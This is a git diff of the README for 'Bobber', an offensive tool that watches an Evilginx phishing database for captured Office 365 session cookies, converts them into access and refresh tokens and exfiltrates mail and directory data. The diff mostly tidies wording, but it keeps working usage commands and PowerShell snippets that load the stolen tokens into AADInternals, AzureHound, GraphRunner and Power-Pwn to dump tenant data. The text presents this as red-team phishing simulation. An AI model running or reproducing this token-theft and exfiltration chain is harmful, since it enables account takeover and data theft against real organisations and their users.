@@ -24,9 +24,9 @@
                                                                         
                                 Bobber - Bounces when a fish bites!
 ```
-Bobber monitors a given Evilginx database file for changes, and if a valid Evilginx session complete with a captured Microsoft Office 365 cookie is found, Bobber will utilize the RoadTools RoadTX library to retrieve the access and refresh token for the user, then optionally trigger TeamFiltration to exfiltrate all the sweet, sweet loot. Bobber supports monitoring a local file path or a file path on a remote host through SSH.
+Bobber monitors a given Evilginx database file for changes, and if a valid Evilginx session complete with a captured Microsoft Office 365 cookie is found, Bobber will utilize the RoadTools RoadTX library to retrieve the access and refresh tokens for the user, then optionally trigger TeamFiltration to exfiltrate all the sweet, sweet loot. Bobber supports monitoring a local file path or a file path on a remote host through SSH.
 
-Bobber accepts a number of input arguments to adjust the RoadTools interactive auth flow, selection between key and credentials-based SSH auth, as well as the added benefit of getting pushover notifications once a user submits their credentials and the loot is on the way.
+Bobber accepts a number of input arguments to adjust the RoadTools interactive auth flow, selection between key and credential-based SSH auth, as well as the added benefit of receiving pushover notifications once a user submits their credentials and the loot is on the way.
 
 ```
 usage: Bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [--all] [--aad] [--teams]
@@ -87,36 +87,36 @@ RoadTools Options:
 
 1. `git clone https://github.com/Flangvik/Bobber`
 2. `pip install -r requirements.txt`
-3. Download the latest version of [TeamFiltration](https://github.com/Flangvik/TeamFiltration/releases/latest) for your platform, and place the binary inside the Bobber folder
+3. Download the latest version of [TeamFiltration](https://github.com/Flangvik/TeamFiltration/releases/latest) for your platform, and place the binary inside the Bobber folder (Optional)
 4. Download the latest version of [Geckodriver](https://github.com/mozilla/geckodriver/releases) for your platform, and place the binary inside the Bobber folder
 5. `python3 Bobber.py --help` and get going!
 
 # Example Usage
 
-Monitor a local file for changes, exchange captured cookie for JWT tokens, get pushover notifications when a new session is found, exfiltrate all data
-```
-python Bobber.py evilginx_data.db --user-key 98fc5roupp78g0ymvzcw2ygun2gz7u --api-token jg3sycg5lwkqoxa647eaqzdhnrtlwy --all
-```
-
-Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchanged cookie for JWT tokens, exfiltrate only AAD Graph API data
+Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchange captured cookie for JWT tokens, and exfiltrate only AAD Users and Groups data from the Graph API
 ```
 python Bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
 ```
 
-Monitor a remote file for changes via SSH, authenticate using a username and password, exchange cookie for JWT tokens,  exfiltrate only emails 
+Monitor a local file for changes, exchange captured cookie for JWT token, and exfiltrate only emails.
 ```
-python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --host 1337.66.69.420  --owa 
+python Bobber.py evilginx_data.db --host 1337.66.69.420  --owa 
 ```
 
-# RoadTools auth file usage with other tools
+Monitor a remote file for changes over SSH. authenticate using username and password, exchange captured cookie for JWT tokens, and exfiltrate all data available.
+```
+python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --all
+```
 
-When Bobber captures an complete Evilginx session, then tokens retrived using RoadTools will be stored in a file with the following naming convnetion `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples, from the context of an PowerShell prompt.
+
+# Usage with other tools
+When Bobber captures a complete Evilginx session, then tokens retrieved using RoadTools will be stored in a file using the following naming convention `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples from the context of a PowerShell prompt.
 
 ### AADInternals
 [AADInternals](https://aadinternals.com/aadinternals/#introduction) is an Modular powershell-framework for exploring the pathways your access might have, created by my favorite finnish person [@DrAzureAD](https://twitter.com/DrAzureAD)
 
 ```
-#read and parse RoadTools auth file into an JSON object
+#Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
 #Add the token information from RoadTools to cache so it will be used for auth
@@ -136,7 +136,7 @@ $msAzJWT =Get-AADIntAccessTokenWithRefreshToken -ClientId "1950a258-227b-4e31-a9
 [AzureHound](https://github.com/BloodHoundAD/AzureHound) is an BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)
 
 ```
-#read and parse RoadTools auth file into an JSON object
+#Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
 #Use the refresh token and tenantId in order to run AzureHound against the tenant
@@ -149,14 +149,14 @@ azurehound.exe -r $roadToolsAuth.refreshToken -t $roadToolsAuth.tenantId list -o
 #Import GraphRunner
 Import-Module .\GraphRunner.ps1
 
-#read and parse RoadTools auth file into an JSON object
+#Read and parse RoadTools auth file into a JSON object
 #While the JSON object of roadtools does not match what GraphRunner needs,enought objects match in order to "trick" GraphRunner into allowing us to run RefreshGraphTokens
 $tokens = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
 #Run RefreshGraphTokens in order to update our $tokens var 
-Invoke-RefreshGraphTokens -RefreshToken $roadToolsAuth.refreshToken  -tenantid $roadToolsAuth.tenantId
+Invoke-RefreshGraphTokens -RefreshToken $roadToolsAuth.refreshToken -tenantid $roadToolsAuth.tenantId
 
-#Most common command to dump a series of information from the GraphAPI
+#Most common command to dump a series of information from the Graph API
 Invoke-GraphRunner -Tokens $tokens
 ```
 
@@ -164,7 +164,7 @@ Invoke-GraphRunner -Tokens $tokens
 ### Power-Pwn
 [Power-Pwn](https://github.com/mbrg/power-pwn) in Python based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
 ```
-#read and parse RoadTools auth file into an JSON object
+#Read and parse RoadTools auth file into a JSON object
 $roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
 
 #Create tokens.json in the same directory you are running powerpwn.exe from
@@ -177,9 +177,10 @@ powerpwn.exe recon -t $roadToolsAuth.tenantId
 powerpwn.exe dump -t $roadToolsAuth.tenantId
 ```
 
-
 # Todo
+- [ ] Allow for capture and notification for other username + password + cookie combinations (then only O365)
+- [ ] Options to get Pushover notifications even if only username + password was captured (no cookie)
 
-- [ ] Allow for capture and notification for other username + password + cookie combinations
-- [ ] 
-- [ ] 
+# Credits
+- [@_dirkjan](https://twitter.com/_dirkjan) for the amazing work that is [RoadTools](https://github.com/dirkjanm/ROADtools) 
+- [mrgretzky](https://twitter.com/mrgretzky) for the raising the standard of phishing simulation with the [evilginx2](https://github.com/kgretzky/evilginx2) toolkit
